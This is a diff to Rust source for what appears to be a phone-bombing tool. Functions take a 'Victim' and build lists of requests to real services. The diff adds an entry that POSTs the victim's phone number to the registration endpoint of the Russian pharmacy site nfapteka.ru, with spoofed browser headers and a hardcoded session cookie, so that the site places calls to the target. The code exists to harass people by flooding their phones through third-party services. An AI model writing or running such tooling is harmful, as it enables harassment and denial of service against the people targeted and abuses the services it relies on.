@@ -199,7 +199,7 @@ pub fn construct_services_list(victim: Victim) -> Vec<Service> {
                     name: "NFApteka".to_string(),
                     service_type: ServiceType::Sms,
                     method: Method::POST,
-                    url: "https://nfapteka.ru/registration/".to_string(),
+                      url: "https://nfapteka.ru/registration/".to_string(),
                     headers: HeaderMap::new(),
                     body_type: BodyType::JSON,
                     body: Default::default(),
@@ -544,6 +544,84 @@ pub fn construct_call_services_list(victim: Victim) -> Vec<Service> {
                 service.body = json!({
                     "phone": phone.phone,
                     "source": "web_auth_page"
+                });
+
+                services.push(service);
+            }
+            //NFApteka
+            {
+                let mut service = Service {
+                    name: "NFApteka".to_string(),
+                    service_type: ServiceType::Call,
+                    method: Method::POST,
+                    url: "https://nfapteka.ru/registration/".to_string(),
+                    headers: HeaderMap::new(),
+                    body_type: BodyType::JSON,
+                    body: Default::default(),
+                };
+
+                service.headers.insert(
+                    "User-Agent",
+                    r#"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0"#
+                        .parse()
+                        .unwrap(),
+                );
+                service
+                    .headers
+                    .insert("Accept", r#"application/json, text/javascript, */*; q=0.01"#.parse().unwrap());
+                service.headers.insert(
+                    "Accept-Language",
+                    r#"ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3"#.parse().unwrap(),
+                );
+                service.headers.insert(
+                    "Accept-Encoding",
+                    r#"gzip, deflate, br, zstd"#.parse().unwrap(),
+                );
+                service
+                    .headers
+                    .insert("Content-Type", r#"application/x-www-form-urlencoded; charset=UTF-8"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("X-Requested-With", r#"XMLHttpRequest"#.parse().unwrap());
+                    
+                service.headers.insert(
+                    "DNT",
+                    r#"1"#.parse().unwrap(),
+                );
+                service.headers.insert(
+                    "Sec-GPC",
+                    r#"1"#
+                        .parse()
+                        .unwrap(),
+                );
+                service.headers.insert("Cookie", r#"rrpvid=386124577368602; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A113%2C%22EXPIRE%22%3A1731790740%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; _ga_V6NTR3RQJV=GS1.1.1723131934.1.1.1723132031.60.0.0; _ga=GA1.1.1422573028.1723131935; rcuid=66b4e8220312d5b9f82e67ac; _ym_uid=1723131943370705992; _ym_d=1723131943; BITRIX_SMQ_SET_CITY=1; BITRIX_SMQ_PK_REGION=moskva; BITRIX_SMQ_PK=moskva; PHPSESSID=oGwBYGK6JiS5oiU2lfHE2ol7mdWdhUB3"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Origin", r#"https://nfapteka.ru"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Connection", r#"keep-alive"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Referer", r#"https://nfapteka.ru/registration/"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Sec-Fetch-Dest", r#"empty"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Sec-Fetch-Mode", r#"cors"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Sec-Fetch-Site", r#"same-origin"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Priority", r#"u=0"#.parse().unwrap());
+                service.headers.insert("TE", r#"trailers"#.parse().unwrap());
+
+                let mut phone = victim.phone.clone();
+                phone.format(WithPlus);
+                service.body = json!({
+                    "phoneNumber": phone.phone,
                 });
 
                 services.push(service);
